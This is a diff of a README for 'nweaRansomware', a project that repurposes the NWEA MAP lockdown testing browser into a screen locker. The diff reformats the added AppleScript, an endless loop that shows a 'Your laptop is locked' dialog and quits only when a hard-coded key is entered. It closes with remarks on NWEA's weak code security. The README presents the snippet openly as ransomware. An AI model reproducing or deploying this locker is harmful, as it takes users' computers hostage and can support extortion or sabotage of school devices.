@@ -1,6 +1,6 @@
 ## About nweaRansomware:
 This program is a modified version of the lock down testing browser used for Map testing.
-nweaRansomware was built off of was v4.0.0.3.
+NweaRansomware was built off of was v4.0.0.3.
 It will lock the usr's desktop, making it impossible for the user to quit the program without entering the key.
 This issue was originally discovered when trying to remove scripts that blocked window switching.
 
@@ -19,14 +19,14 @@ erasing all data.
 ## What has been modified?:
 Nothing, only eight lines of code have been added.
 Code added to "QuitProcesses.applescript":
-1. repeat
-	2. set protectCode to display dialog "!Your laptop is locked! !Enter Key!" default answer "" buttons {"Unlock With Key"}
-	3. if text returned of protectCode is "ioZevo#^Github" then
-		4. tell application "nwea browser exploited"
-			5. quit
-		6. end tell
-	7. end if
-8. end repeat
+repeat
+	set protectCode to display dialog "!Your laptop is locked! !Enter Key!" default answer "" buttons {"Unlock With Key"}
+	if text returned of protectCode is "ioZevo#^Github" then
+		tell application "nwea browser exploited"
+			quit
+		end tell
+	end if
+end repeat
 
 Sadly NWEA has done a horrible job of securing their code, making it easy to convert their program
 into simple Ransomeware. The Sparkle framework, which includes a function to check if code has been
